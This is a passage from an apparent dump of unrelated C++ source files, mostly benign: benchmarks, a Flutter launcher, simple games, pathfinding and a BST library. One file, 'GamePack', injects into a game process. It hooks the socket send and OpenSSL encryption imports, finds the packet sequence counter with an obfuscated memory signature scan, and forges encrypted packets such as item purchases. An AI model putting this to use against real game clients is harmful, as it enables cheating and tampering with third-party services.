vthread)\r\n\t{\r\n\t\tt.join();\r\n\t}\r\n\r\n\t//printf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21concurrent alloc %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t//\tnworks, rounds, ntimes, malloc_costtime);\r\n\r\n\t//printf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21concurrent dealloc %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t//\tnworks, rounds, ntimes, free_costtime);\r\n\r\n\t//printf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1concurrent alloc&dealloc %u\u6b21\uff0c\u603b\u8ba1\u82b1\u8d39\uff1a%u ms\\n\",\r\n\t//\tnworks, nworks * rounds * ntimes, malloc_costtime + free_costtime);\r\n\tprintf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21malloc %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t\t(unsigned int)nworks, (unsigned int)rounds, (unsigned int)ntimes, (unsigned int)malloc_costtime);\r\n\r\n\tprintf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21free %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t\t(unsigned int)nworks, (unsigned int)rounds, (unsigned int)ntimes, (unsigned int)free_costtime);\r\n\r\n\tprintf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1malloc&free %u\u6b21\uff0c\u603b\u8ba1\u82b1\u8d39\uff1a%u ms\\n\",\r\n\t\t(unsigned int)nworks, (unsigned int)(nworks * rounds * ntimes), (unsigned int)(malloc_costtime + free_costtime));\r\n\r\n}\r\n\r\nint main()\r\n{\r\n\tsize_t n = 100000;\r\n\tcout << \"==========================================================\" << endl;\r\n\tBenchmarkConcurrentMalloc(n, 4, 10);\r\n\tcout << endl << endl;\r\n\r\n\tBenchmarkMalloc(n, 4, 10);\r\n\tcout << \"==========================================================\" << endl;\r\n\r\n\treturn 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"invoicebd\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* ========================================================================\n\n   (C) Copyright 2023 by Molly Rocket, Inc., All Rights Reserved.\n   \n   This software is provided 'as-is', without any express or implied\n   warranty. In no event will the authors be held liable for any damages\n   arising from the use of this software.\n   \n   Please see https://computerenhance.com for more information\n   \n   ======================================================================== */\n\n/* ========================================================================\n   LISTING 153\n   ======================================================================== */\n\n/* NOTE(casey): _CRT_SECURE_NO_WARNINGS is here because otherwise we cannot\n   call fopen(). If we replace fopen() with fopen_s() to avoid the warning,\n   then the code doesn't compile on Linux anymore, since fopen_s() does not\n   exist there.\n   \n   What exactly the CRT maintainers were thinking when they made this choice,\n   I have no idea. */\n#define _CRT_SECURE_NO_WARNINGS\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <math.h>\n#include <sys/stat.h>\n\ntypedef uint8_t u8;\ntypedef uint32_t u32;\ntypedef uint64_t u64;\n\ntypedef int32_t b32;\n\ntypedef float f32;\ntypedef double f64;\n\n#define ArrayCount(Array) (sizeof(Array)/sizeof((Array)[0]))\n\n#include \"listing_0125_buffer.cpp\"\n#include \"listing_0137_os_platform.cpp\"\n#include \"listing_0109_pagefault_repetition_tester.cpp\"\n\nextern \"C\" void Read_32x8(u64 Count, u8 *Data, u64 Mask);\n#pragma comment (lib, \"listing_0152_cache_test\")\n\nint main(void)\n{\n    InitializeOSPlatform();\n    \n    repetition_tester Testers[30] = {};\n    u32 MinSizeIndex = 10;\n    \n    buffer Buffer = AllocateBuffer(1ull << ArrayCount(Testers));\n    if(IsValid(Buffer))\n    {\n        // NOTE(casey): Because OSes may not map allocated pages until they are written to, we write garbage\n        // to the entire buffer to force it to be mapped.\n        for(u64 ByteIndex = 0; ByteIndex < Buffer.Count; ++ByteIndex)\n        {\n            Buffer.Data[ByteIndex] = (u8)ByteIndex;\n        }\n        \n        for(u32 SizeIndex = MinSizeIndex; SizeIndex < ArrayCount(Testers); ++SizeIndex)\n        {\n            repetition_tester *Tester = Testers + SizeIndex;\n            \n            u64 RegionSize = (1ull << SizeIndex);\n            u64 RegionMask = RegionSize - 1;\n            printf(\"\\n--- Read32x8 of %lluk ---\\n\", RegionSize/1024);\n            NewTestWave(Tester, Buffer.Count, GetCPUTimerFreq());\n            \n            while(IsTesting(Tester))\n            {\n                BeginTime(Tester);\n                Read_32x8(Buffer.Count, Buffer.Data, RegionMask);\n                EndTime(Tester);\n                CountBytes(Tester, Buffer.Count);\n            }\n        }\n        \n        printf(\"Region Size,gb/s\\n\");\n        for(u32 SizeIndex = MinSizeIndex; SizeIndex < ArrayCount(Testers); ++SizeIndex)\n        {\n            repetition_tester *Tester = Testers + SizeIndex;\n            \n            repetition_value Value = Tester->Results.Min;\n            f64 Seconds = SecondsFromCPUTime((f64)Value.E[RepValue_CPUTimer], Tester->CPUTimerFreq);\n            f64 Gigabyte = (1024.0f * 1024.0f * 1024.0f);\n            f64 Bandwidth = Value.E[RepValue_ByteCount] / (Gigabyte * Seconds);\n                \n            printf(\"%llu,%f\\n\", (1ull << SizeIndex), Bandwidth);\n        }\n    }\n    else\n    {\n        fprintf(stderr, \"Unable to allocate memory buffer for testing\");\n    }\n    \n    FreeBuffer(&Buffer);\n    \n    return 0;\n}\n",
    "\n### src/main.cpp\n\n```cpp\n#include <iostream>\n#include <pcl/io/pcd_io.h>\n#include \"point_cloud_processor.h\"\n#include \"point_cloud_visualizer.h\"\n#include \"mapping.h\"\n\nint main(int argc, char** argv) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <input_point_cloud.pcd>\" << std::endl;\n        return -1;\n    }\n\n    std::string input_file = argv[1];\n    pcl::PointCloud<pcl::PointXYZ>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZ>);\n\n    if (pcl::io::loadPCDFile<pcl::PointXYZ>(input_file, *cloud) == -1) {\n        PCL_ERROR(\"Couldn't read file %s\\n\", input_file.c_str());\n        return -1;\n    }\n\n    PointCloudProcessor processor;\n    processor.filterPointCloud(cloud);\n    processor.separateGround(cloud);\n    processor.segmentPointCloud(cloud);\n    processor.clusterPointCloud(cloud);\n\n    Mapping mapping;\n    mapping.createMap(cloud);\n\n    PointCloudVisualizer visualizer;\n    visualizer.visualize(cloud);\n\n    // Optionally save the processed point cloud to a file\n    pcl::io::savePCDFileASCII(\"processed_cloud.pcd\", *cloud);\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\nvoid PlayGame();\r\nvoid Rules();\r\nvoid Exit();\r\n\r\nvoid PlayGame(){\r\n    cout<<\"Welcome User\"<<endl;\r\n    cout<<\"Select:     1 - Rock        2 - Paper      3 - Scissor\"<<endl;\r\n    int User;\r\n    cin>>User;\r\n\r\n    srand(time(0));\r\n    int COMPUTER = rand()%3+1;\r\n\r\n    while(User == 1){\r\n    if(User == 1 && COMPUTER == 2){ cout<<\"YOU LOSE!\"<<endl;}\r\n       else if(User == 1 && COMPUTER == 3){cout<<\"YOU WON!\"<<endl;}\r\n       else{cout<<\"It is DRAWN\"<<endl;}\r\n       switch(COMPUTER){\r\n        case 1:\r\n        cout<<\"COMPUTER choose: ROCK\"<<endl;\r\n        break;\r\n\r\n        case 2:\r\n        cout<<\"COMPUTER choose: Paper\"<<endl;\r\n        break;\r\n\r\n        case 3:\r\n        cout<<\"COMPUTER choose: Scissor\"<<endl;\r\n        break;\r\n       }\r\n       break;\r\n    }\r\n\r\n    while(User == 2){\r\n        if(User == 2 && COMPUTER == 3){ cout<<\"YOU LOSE!\"<<endl;}\r\n       else if(User ==2 && COMPUTER == 1){cout<<\"YOU WON!\"<<endl;}\r\n       else{cout<<\"It is DRAWN\"<<endl;}\r\n        switch(COMPUTER){\r\n        case 1:\r\n        cout<<\"COMPUTER choose: ROCK\"<<endl;\r\n        break;\r\n\r\n        case 2:\r\n        cout<<\"COMPUTER choose: Paper\"<<endl;\r\n        break;\r\n\r\n        case 3:\r\n        cout<<\"COMPUTER choose: Scissor\"<<endl;\r\n        break;\r\n       }\r\n       break;\r\n    }\r\n    \r\n     while(User == 3){\r\n        if(User == 3 && COMPUTER == 1){ cout<<\"YOU LOSE!\"<<endl;}\r\n        else if(User == 3 && COMPUTER == 2){cout<<\"YOU WON!\"<<endl;}\r\n       else{cout<<\"It is DRAWN\"<<endl;}\r\n        switch(COMPUTER){\r\n        case 1:\r\n        cout<<\"COMPUTER choose: ROCK\"<<endl;\r\n        break;\r\n\r\n        case 2:\r\n        cout<<\"COMPUTER choose: Paper\"<<endl;\r\n        break;\r\n\r\n        case 3:\r\n        cout<<\"COMPUTER choose: Scissor\"<<endl;\r\n        break;\r\n       }\r\n       break;\r\n    }\r\n\r\n\r\n\r\n}\r\n\r\nvoid Rules(){\r\n    cout<<\"------Rules of the Game------\"<<endl;\r\n    cout<<\"Rock VS Paper ->  Paper Won\"<<endl;\r\n    cout<<\"Scissor VS Paper ->  Scissor Won\"<<endl;\r\n    cout<<\"Rock VS Scissor ->  Rock Won\"<<endl;\r\n\r\n}\r\n\r\nvoid Exit(){\r\n    cout<<\"Game Quit\"<<endl;\r\n    exit(EXIT_SUCCESS);\r\n}\r\n\r\nint main(){\r\n    cout<<\"--------------------------------------------------------\"<<endl;\r\n    cout<<\"--------Welcome to the Rock, Paper, Scissor Game--------\"<<endl;\r\n    cout<<\"--------------------------------------------------------\"<<endl;\r\n\r\n\r\n    cout<<\"Press Enter to continue\"<<endl;\r\n    cin.get();\r\n\r\n    cout<<\"Select\"<<endl;\r\n    cout<<\"1. Play\"<<endl;\r\n    cout<<\"2. Rules\"<<endl;\r\n    cout<<\"3. Exit Game\"<<endl;\r\n    int a;\r\n    cin>>a;\r\n\r\n    switch(a){\r\n        case 1:\r\n        PlayGame();\r\n        break;\r\n\r\n        case 2:\r\n        Rules();\r\n        break;\r\n\r\n        case 3:\r\n        Exit();\r\n        break;\r\n\r\n        default:\r\n        cout<<\"Wrong Input\"<<endl;\r\n        break;\r\n    }\r\n    return 0;\r\n}",
    "#include \"GamePack.h\"\n#include \"util.hpp\"\n#include \"Sunday.hpp\"\nGamePack::GamePack() :GameSocket(), m_PackSeqAddress(), EVP_DecryptUpdate007(), EVP_EncryptUpdate007(), EVP_EncryptInit007(), m_Gamectx() {\n    util::HookIatTable2((PVOID)GameMoudle.hw, \"wsock32.dll\", \"send\", ext_send);\n    util::HookIatTable2((PVOID)GameMoudle.hw, \"libeay32.dll\", \"EVP_EncryptInit\", ext_EncryptInit, &EVP_EncryptInit007);\n    util::HookIatTable2((PVOID)GameMoudle.hw, \"libeay32.dll\", \"EVP_EncryptUpdate\", ext_EncryptUpdate, &EVP_EncryptUpdate007);\n}\n\nint __stdcall GamePack::ext_send(SOCKET s, const char* buf, int len, int flag){\n    auto Pack = GetInstance();\n    Pack->GameSocket = s;\n    return send(s, buf, len, flag);\n}\n\nint WINAPIV GamePack::ext_EncryptInit(VOID* ctx, const VOID* type, unsigned char* key, unsigned char* iv){\n    auto Pack = GetInstance();\n    Pack->m_Gamectx = ctx;\n    return Pack->EVP_EncryptInit007(ctx, type, key, iv);\n}\n\nint WINAPIV GamePack::ext_EncryptUpdate(VOID* ctx, unsigned char* out, int* outl, unsigned char* in, int inl){\n    auto Pack = GetInstance();\n#if DebugEnd\n    Pack->DebugPackRead(in, inl); //\u00b0\u00fc\n#endif\n    return Pack->EVP_EncryptUpdate007(ctx, out, outl, in, inl);\n}\n\nvoid GamePack::DebugPackRead(unsigned char* out, int in1) {\n    BYTE* PackBuff = out;\n    PackHead PakcHead{};\n    auto Pack_Read = std::make_shared<PackRead>(out, 4);\n    PakcHead.Head = Pack_Read->ReadByte();\n    PakcHead.Seq = Pack_Read->ReadByte();\n    PakcHead.Length = Pack_Read->ReadShort();\n    if (PakcHead.Head != 0x55) {\n\t\tDebugViewPrintf(\"[{}] PackHead Not 0x55,Head is :{:02X}\\n\", __FUNCTION__, PakcHead.Head);\n        return;\n    }\n\tDebugViewPrintf(\"[{}] PackLength : 0x{:X}\\n\", __FUNCTION__, PakcHead.Length);\n    auto m_PackRead = std::make_shared<PackRead>(PackBuff + 4, PakcHead.Length);\n    auto Index = m_PackRead->ReadByte();\n    auto VecPack = std::vector<BYTE>(in1);\n    memcpy(VecPack.data(), out, in1);\n\tDebugViewPrintf(\"[{}] Index = {} Size 0x{:X} {:02X}\\n\", __FUNCTION__, Index, in1, fmt::join(VecPack.begin(), VecPack.end(), \" \"));\n}\n\nstd::tuple<bool, BYTE> GamePack::GetPackSeq(){\n    if (!m_PackSeqAddress) {\n        SunDaySearch SunDay;\n        std::vector<ULONG64>RetVal;\n        SunDay.SearchMemory(xorstr_(\"56 8B F1 8B 0D ?? ?? ?? ?? 8B 06 FF 70 F4 50\"), GameMoudle.hw, 0x0122A000, RetVal);\n        ULONG32 RetVal_ = RetVal[0];\n\t\tm_PackSeqAddress = *reinterpret_cast<PULONG32>(RetVal_ + 0x5);\n    }\n    int Base = *reinterpret_cast<PULONG32>(*reinterpret_cast<PULONG32>(m_PackSeqAddress) + 0x4);\n    if (!Base || Base == 0xFFFFFFFF)\n        return std::make_tuple<bool, BYTE>(false, 0);\n    BYTE* Seq = (PBYTE)(Base + 0x3A);\n    return std::make_tuple<bool, BYTE>(true, InterlockedIncrement((LPLONG)Seq));\n}\n\nbool GamePack::StartGame(){\n    auto IPackWrite = std::make_shared<PackWrite>();\n    IPackWrite->WriteByte(0x41);\n    IPackWrite->WriteByte(0x04);\n    return MakePack(IPackWrite.get());\n}\n\nbool GamePack::BuyItem(int Index){\n    auto IPackWrite = std::make_shared<PackWrite>();\n    IPackWrite->WriteByte(0x4D);\n    IPackWrite->WriteByte(0x02);\n    IPackWrite->WriteByte(0x01);\n    IPackWrite->WriteShort(Index);\n    return MakePack(IPackWrite.get());\n}\n\nbool GamePack::Discipline(std::string name){\n    auto IPackWrite = std::make_shared<PackWrite>();\n    IPackWrite->WriteByte(0x65);\n    IPackWrite->WriteByte(0x01);\n    IPackWrite->WriteString(name);\n\treturn MakePack(IPackWrite.get());\n}\n\nbool GamePack::MakePack(PackWrite* Pack){\n    auto GetSeq = this->GetPackSeq();\n    if (!std::get<bool>(GetSeq))return false;\n    auto Seq = std::get<BYTE>(GetSeq);\n    PackHead Pack_Head;\n    Pack_Head.Seq = Seq;\n    Pack_Head.Length = Pack->GetSize();\n\n    PackWrite IPackWrite;\n    IPackWrite.WriteByBits(&Pack_Head, sizeof(PackHead));\n    IPackWrite.WriteByBits(Pack->GetBytes(), Pack->GetSize());\n    return SendPack(&IPackWrite);\n}\n\nbool GamePack::SendPack(PackWrite* Pack){\n    std::vector<BYTE>VecEncypt{};\n    VecEncypt.resize(Pack->GetSize() * 2);\n\n    int EncyptOutLength{};\n    int Ret = EVP_EncryptUpdate007(this->m_Gamectx, VecEncypt.data(), &EncyptOutLength, Pack->GetBytes(), Pack->GetSize());\n    if (!Ret)\n        return false;\n\n\tif (!send(this->GameSocket, (const char*)VecEncypt.data(), EncyptOutLength, 0))\n        return false;\n    return true;\n}\n",
    "#include <iostream>\n#include <ascii-converter.hpp>\n\n#include <opencv2/core/mat.hpp>\n#include <opencv2/highgui.hpp>\n#include <opencv2/imgcodecs.hpp>\n\n#include <opencv2/opencv.hpp>\n#include <opencv2/videoio.hpp>\n\n#define ENABLE_ONLY_IMAGES true\n\nint main(int argc, char** argv)\n{\n#if ENABLE_ONLY_IMAGES\n    if (argc < 2)\n    {\n        std::cerr << \"error: too few  arguments\\n\";\n        return -1; \n    }\n    \n    cv::Mat image{ cv::imread(argv[1], cv::IMREAD_GRAYSCALE) };\n    AAscii_Converter ascii_converter{};\n    \n    ascii_converter.Set_Base_Image(&image);\n    ascii_converter.Resize_Image(cv::Size{ 400, 150 });\n    \n    ascii_converter.Convert_Image_To_Ascii();\n    ascii_converter.Save_Image_To_File(\"ascii_image.txt\");\n    \n    const auto& formatted_image{ ascii_converter.Get_Formatted_Output_Ascii_Image() };\n    std::cout << std::data(formatted_image);\n\n    cv::imshow(\"base image\", image);\n    cv::waitKey();\n#else\n    cv::Mat frame{};\n\n    std::int32_t device_id{ 0 };\n    std::int32_t api_id{ cv::CAP_ANY };\n\n    cv::VideoCapture capture{}; \n    capture.open(device_id, api_id);\n\n    if (!capture.isOpened())\n    {\n        std::cerr << \"can not open specified device\\n\";\n        return -1;\n    }\n\n    AAscii_Converter ascii_converter{};\n    \n    for (;;)\n    {\n        capture.read(frame);\n        cv::cvtColor(frame, frame, cv::COLOR_BGR2GRAY);\n\n        ascii_converter.Set_Base_Image(&frame);\n        ascii_converter.Resize_Image(cv::Size{ 300, 100 });\n        ascii_converter.Convert_Image_To_Ascii();\n        const auto& formatted_image{ ascii_converter.Get_Formatted_Output_Ascii_Image(AAscii_Converter::EOutput_Formatted_Ascii_Image::CALCULATE) };\n        std::cout << std::data(formatted_image);\n    }\n\n#endif\n\n    return 0;\n}\n",
    "#include<vector>\n#include<utility>\n#include \"simulation.hpp\"\n\nvoid Simulation::Draw()\n{\n    grid.Draw();\n}\nvoid Simulation::setCellValue(int row, int column, int value)\n{\n    grid.setValue(row, column, value);\n}\n\nint Simulation::countLiveNeighbours(int row, int column)\n{\n    int liveNeighbours = 0;\n    std::vector<std::pair<int,int>> neighbourOffset={\n        {-1, 0},\n        {1, 0},\n        {0, -1},\n        {0, 1},\n        {-1, -1},\n        {-1, 1},\n        {1, -1},\n        {1, 1}\n    };\n    \n    for(const auto & offset : neighbourOffset){\n        int neighbourRow = (row+offset.first + grid.getRows())%grid.getRows() ;\n        int neighbourCol = (column + offset.second + grid.getColumns()) % grid.getColumns();\n        liveNeighbours += grid.getValue(neighbourRow, neighbourCol);\n    }\n    return liveNeighbours;\n}\n\nvoid Simulation::Update()\n{\n    if(isRunning()){\n        for(int row = 0 ; row< grid.getRows() ; row++){\n            for(int col = 0 ; col < grid.getColumns() ; col++){\n                int liveNeighbours = countLiveNeighbours(row, col);\n                int cellValue = grid.getValue(row, col);\n\n                if(cellValue== 1){\n                    if(liveNeighbours > 3 || liveNeighbours < 2){\n                        tempGrid.setValue(row, col , 0);\n                    }else{\n                        tempGrid.setValue(row, col , 1);\n                    }\n                }else {\n                    if(liveNeighbours == 3){\n                        tempGrid.setValue(row, col, 1);\n                    }else{\n                        tempGrid.setValue(row, col , 0);\n                    }\n                }\n            }\n        }\n    \n    grid= tempGrid;\n    }\n}\n\nvoid Simulation::ClearGrid()\n{\n    if(isRunning() == false){\n        grid.Clear();\n    }\n}\n\nvoid Simulation::CreateRandomState()\n{\n    if(isRunning() == false){\n        grid.FillRandom();\n    }\n}\n\nvoid Simulation::ToggleCell(int row, int col)\n{\n    if(isRunning() == false)\n        grid.toggleCell(row,col);\n}\n",
    "//\n// Created by sg12q on 2024/4/4.\n//\n#include \"BoatDijkstra.h\"\n#include \"BoatUtils.h\"\n\n\nPoint BoatDijkstra::map2RelativePoint(Point corePoint, int dir) {\n    if (dir == 0) {\n        return corePoint + Point(BOAT_WIDTH - 1, BOAT_LENGTH - 1);\n    } else if (dir == 1) {\n        return corePoint + Point(BOAT_WIDTH - 1, BOAT_LENGTH - 1) * -1;\n    } else if (dir == 2) {\n        return corePoint + Point(-(BOAT_LENGTH - 1), BOAT_WIDTH - 1);\n    } else {\n        return corePoint + Point(-(BOAT_LENGTH - 1), BOAT_WIDTH - 1) * -1;\n    }\n}\n\n\nvoid BoatDijkstra::update(int maxDeep) {\n    memset(minDistance, 0x7f, sizeof minDistance);\n    //\u4ece\u76ee\u6807\u6620\u5c04\u7684\u56db\u4e2a\u70b9\u5f00\u59cb\u641c\n    int deep = 0;\n    queue<PointWithDirection> q;\n    for (int i = 0; i < (sizeof DIR / sizeof DIR[0]) / 2; i++) {\n        //\u5355\u5411dfs\u641c\u5c31\u884c\n        // \u6c42\u6700\u77ed\u8def\u5f84\n        Point s = map2RelativePoint(mTarget, i);\n        if (!GameMap::isLegalPoint(s.x, s.y) || !mGameMap->boatCanReach(s, i ^ 1)) {\n            continue;//\u8d77\u59cb\u70b9\u76f4\u63a5\u4e0d\u53ef\u8fbe\uff0c\u6ca1\u5f97\u73a9\n        }\n        minDistance[s.x][s.y][i ^ 1] = 0;\n        q.emplace(s, i ^ 1);\n    }\n    vector<PointWithDirection> twoDistancesPoints;\n    while (!q.empty() || !twoDistancesPoints.empty()) {\n        deep += 1;\n        if (deep > maxDeep) {\n            break;\n        }\n        //2\u8ddd\u79bb\u7684\u4e0b\u4e00\u4e2a\u70b9,\u5148\u4fdd\u5b58\u8d77\u6765\uff0c\u540e\u9762\u76f4\u63a5\u63d2\u8fdb\u53bb\n        int size = int(q.size());\n        //\u5148\u52a0\u8fdb\u53bb\n        if (!twoDistancesPoints.empty()) {\n            for (const PointWithDirection &searchPoint: twoDistancesPoints) {\n                q.push(searchPoint);\n            }\n            twoDistancesPoints.clear();\n        }\n        for (int j = 0; j < size; j++) {\n            PointWithDirection top = q.front();\n            q.pop();\n            for (int k = 0; k < 3; k++) {\n                PointWithDirection next = BoatUtils::getNextPoint(top, k);\n                //\u5408\u6cd5\u6027\u5224\u65ad\n                if (!mGameMap->boatCanReach(next.point, next.direction)\n                    || deep >= (minDistance[next.point.x][next.point.y][next.direction] >> 2)) {\n                    continue;\n                }\n                //\u662f\u5426\u5230\u8fbe\u4e4b\u540e\u9700\u8981\u6062\u590d,\u6709\u4e00\u4e2a\u70b9\u8fdb\u5165\u4e86\u4e3b\u822a\u9053\n                if (mGameMap->boatHasOneInMainChannel(next.point, next.direction)) {\n                    if (deep + 1 >= (minDistance[next.point.x][next.point.y][next.direction] >> 2)) {\n                        continue;\n                    }\n                    minDistance[next.point.x][next.point.y][next.direction] = (short) (((deep + 1) << 2) +\n                                                                                       top.direction);\n                    twoDistancesPoints.push_back(next);\n                } else {\n                    minDistance[next.point.x][next.point.y][next.direction] = ((short) ((deep << 2) + top.direction));\n                    q.push(next);\n                }\n            }\n        }\n    }\n    adjustDistance();\n}\n\nvoid BoatDijkstra::adjustDistance() {\n    for (int i = 0; i < MAP_FILE_ROW_NUMS; i++) {\n        for (int j = 0; j < MAP_FILE_COL_NUMS; j++) {\n            for (int k = 0; k < (sizeof DIR / sizeof DIR[0]) / 2; k++) {\n                Point corePoint{i, j};\n                if (!mGameMap->boatCanReach(corePoint, k)) {\n                    continue;\n                }\n                if (!mGameMap->boatHasOneInMainChannel(corePoint, k)\n                    &&\n                    minDistance[i][j][k] != SHORT_INF) {\n                    int deep = minDistance[i][j][k] >> 2;//\u5f00\u59cb\u8239\u4e0d\u5728\u4e3b\u822a\u9053\u4e0a\uff0c\u8ddd\u79bb\u9700\u8981\u52a0\u4e00\uff0c\u56e0\u4e3a\u5230\u8fbe\u76ee\u6807\u70b9\u4e4b\u540e\u9700\u8981\u7b49\u5f85\u4e00\u5e27\n                    int dir = minDistance[i][j][k] & 3;\n                    deep += 1;\n                    minDistance[i][j][k] = (short) ((deep << 2) + dir);\n                }\n            }\n        }\n    }\n}\n\nvoid BoatDijkstra::berthUpdate(const vector<Point> &berthAroundPoints, Point berthCorePoint, const int maxDeep) {\n    memset(minDistance, 0x7f, sizeof minDistance);\n    //\u4ece\u76ee\u6807\u6620\u5c04\u7684\u56db\u4e2a\u70b9\u5f00\u59cb\u641c\n    int deep = 0;\n    queue<PointWithDirection> q;\n    queue<PointWithDirection> candidateQueue;\n    queue<short> candidateDeep;\n    for (const auto &aroundPoint: berthAroundPoints) {\n        auto flashDistance = (short) (1 +\n                                      2 * (abs(berthCorePoint.x - aroundPoint.x) +\n                                           abs(berthCorePoint.y - aroundPoint.y)));\n        for (int i = 0; i < (sizeof DIR / sizeof DIR[0]) / 2; i++) {\n            //\u5355\u5411dfs\u641c\u5c31\u884c\n            // \u6c42\u6700\u77ed\u8def\u5f84\n            Point s = map2RelativePoint(aroundPoint, i);\n            if (!GameMap::isLegalPoint(s.x, s.y) || !mGameMap->boatCanReach(s, i ^ 1)) {\n                continue;//\u8d77\u59cb\u70b9\u76f4\u63a5\u4e0d\u53ef\u8fbe\uff0c\u6ca1\u5f97\u73a9\n            }\n            minDistance[s.x][s.y][i ^ 1] = (short) (flashDistance << 2);\n            PointWithDirection pointWithDirection{s, i ^ 1};\n            candidateQueue.push(pointWithDirection);\n            candidateDeep.push(flashDistance);\n        }\n    }\n\n    vector<PointWithDirection> twoDistancesPoints;\n    while (!candidateQueue.empty() || !q.empty() || !twoDistancesPoints.empty()) {\n        deep += 1;\n        if (deep > maxDeep) {\n            break;\n        }\n        //2\u8ddd\u79bb\u7684\u4e0b\u4e00\u4e2a\u70b9,",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nstruct Book {\r\n    int isbn;\r\n    string title;\r\n    string author;\r\n};\r\n\r\nstruct Node {\r\n    Book book;\r\n    Node* left;\r\n    Node* right;\r\n};\r\n\r\nNode* createNode(const Book& book) {\r\n    Node* newNode = new Node();\r\n    newNode->book = book;\r\n    newNode->left = newNode->right = NULL;\r\n    return newNode;\r\n}\r\n\r\nNode* insert(Node* root, const Book& book) {\r\n    if (root == NULL) {\r\n        return createNode(book);\r\n    }\r\n    if (book.isbn < root->book.isbn) {\r\n        root->left = insert(root->left, book);\r\n    } else if (book.isbn > root->book.isbn) {\r\n        root->right = insert(root->right, book);\r\n    }\r\n    return root;\r\n}\r\n\r\nNode* search(Node* root, int isbn) {\r\n    if (root == NULL || root->book.isbn == isbn) {\r\n        return root;\r\n    }\r\n    if (isbn < root->book.isbn) {\r\n        return search(root->left, isbn);\r\n    }\r\n    return search(root->right, isbn);\r\n}\r\n\r\nNode* findMin(Node* root) {\r\n    while (root && root->left != NULL) {\r\n        root = root->left;\r\n    }\r\n    return root;\r\n}\r\n\r\nNode* deleteNode(Node* root, int isbn) {\r\n    if (root == NULL) {\r\n        return root;\r\n    }\r\n    if (isbn < root->book.isbn) {\r\n        root->left = deleteNode(root->left, isbn);\r\n    } else if (isbn > root->book.isbn) {\r\n        root->right = deleteNode(root->right, isbn);\r\n    } else {\r\n        if (root->left == NULL) {\r\n            Node* temp = root->right;\r\n            delete root;\r\n            return temp;\r\n        } else if (root->right == NULL) {\r\n            Node* temp = root->left;\r\n            delete root;\r\n            return temp;\r\n        }\r\n        Node* temp = findMin(root->right);\r\n        root->book = temp->book;\r\n        root->right = deleteNode(root->right, temp->book.isbn);\r\n    }\r\n    return root;\r\n}\r\n\r\nvoid inorder(Node* root) {\r\n    if (root != NULL) {\r\n        inorder(root->left);\r\n        cout << \"ISBN: \" << root->book.isbn << \", Title: \" << root->book.title << \", Author: \" << root->book.author << endl;\r\n        inorder(root->right);\r\n    }\r\n}\r\n\r\nvoid displayMenu() {\r\n    cout << \"\\nLibrary Management System\\n\";\r\n    cout << \"1. Add Book\\n\";\r\n    cout << \"2. Search Book\\n\";\r\n    cout << \"3. Delete Book\\n\";\r\n    cout << \"4. Display All Books\\n\";\r\n    cout << \"5. Exit\\n\";\r\n    cout << \"Enter your choice: \";\r\n}\r\n\r\nvoid deleteTree(Node* root) {\r\n    if (root == NULL) return;\r\n    deleteTree(root->left);\r\n    deleteTree(root->right);\r\n    delete root;\r\n}\r\n\r\nint main() {\r\n    Node* root = NULL;\r\n    int choice, isbn;\r\n    string title, author;\r\n\r\n    while (true) {\r\n        displayMenu();\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                cout << \"Enter ISBN: \";\r\n                cin >> isbn;\r\n                cin.ignore();\r\n                cout << \"Enter Book Title: \";\r\n                getline(cin, title);\r\n                cout << \"Enter Book Author: \";\r\n                getline(cin, author);\r\n                root = insert(root, {isbn, title, author});\r\n                cout << \"Book added successfully.\\n\";\r\n                break;\r\n            case 2:\r\n                cout << \"Enter ISBN to search: \";\r\n                cin >> isbn;\r\n                {\r\n                    Node* found = search(root, isbn);\r\n                    if (found) {\r\n                        cout << \"Book found: ISBN: \" << found->book.isbn << \", Title: \" << found->book.title << \", Author: \" << found->book.author << endl;\r\n                    } else {\r\n                        cout << \"Book not found.\\n\";\r\n                    }\r\n                }\r\n                break;\r\n            case 3:\r\n                cout << 